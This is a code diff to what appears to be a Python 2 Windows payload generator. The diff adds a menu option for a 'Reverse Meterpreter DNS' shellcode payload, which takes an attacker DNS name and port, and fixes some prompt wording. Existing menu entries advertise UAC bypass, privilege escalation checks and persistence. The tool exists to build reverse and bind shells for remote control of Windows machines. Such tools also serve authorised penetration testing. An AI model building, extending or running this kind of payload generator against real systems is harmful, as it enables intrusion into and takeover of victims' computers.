@@ -62,6 +62,8 @@ print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
        ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
 print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
        t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 6) + t.normal
+print ('[5] Windows Reverse Meterpreter DNS' + t.bold_green + '(Staged)' +
+       t.bold_red + ' [BETA]').center(t.width + 6) + t.normal
 print '=' * t.width
 
 try:
@@ -83,6 +85,10 @@ try:
             payloadchoice = SHELLCODE.windows_met_rev_https_shell
             payload = 'Windows Meterpreter Reverse HTTPS '
             break
+        elif menuchoice == '5':
+            payloadchoice = SHELLCODE.windows_met_rev_shell_dns
+            payload = 'Windows Meterpreter Reverse Shell DNS '
+            break
         else:
             print t.bold_red + '[*] Wrong Selection' + t.normal
 
@@ -102,7 +108,7 @@ try:
         else:
             print t.bold_red + 'Error Getting Ip Automatically'
             ipaddr = raw_input(
-                '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+                '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
 
         print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
         try:
@@ -135,9 +141,22 @@ try:
         try:
             bindporthex = struct.pack('>h', int(bindport))
         except:
-            print t.bold_red + '[*] Error in IP Syntax'
+            print t.bold_red + '[*] Error in Port Syntax'
             sys.exit(1)
         shellcode = payloadchoice % (bindporthex)
+    elif menuchoice == '5':
+        portnum = raw_input(
+            '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
+        if len(portnum) is 0:
+            portnum = 4444
+        try:
+            porthex = struct.pack('>h', int(portnum))
+        except:
+            print t.bold_red + '[*] Error in Port Syntax'
+            sys.exit(1)
+        DNSaddr = raw_input(
+            '\n[*] Please Enter DNS Name Manually\n[*] DNS> ')
+        shellcode = payloadchoice % (DNSaddr,porthex)
 
     if menuchoice == '2' or menuchoice == '3' or menuchoice == '4':
         want_UACBYPASS = raw_input(
